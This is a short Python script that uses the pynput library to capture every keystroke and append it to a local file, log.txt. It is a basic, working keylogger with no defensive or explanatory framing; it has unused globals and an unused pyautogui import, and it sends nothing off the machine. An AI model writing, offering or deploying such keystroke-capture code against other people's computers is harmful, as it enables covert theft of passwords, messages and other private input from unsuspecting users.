import pynput
import pyautogui
count = 0

global hitcount
global mouselistener
global filename
hitcount = 0

def on_press(key):
    global filename
    print(str(key).strip("'"))
    filename = open("log.txt", "a")
    strippedkey = str(key).strip("'")
    if(not(strippedkey.isalpha()) and not(strippedkey.isalnum())):
        filename.write("\n")
    filename.write(str(key).strip("'"))
    if(not(strippedkey.isalpha()) and not(strippedkey.isalnum())):
        filename.write("\n")
    filename.close()



listener = pynput.keyboard.Listener(on_press =on_press)
listener.start()
listener.join()
listener.stop()
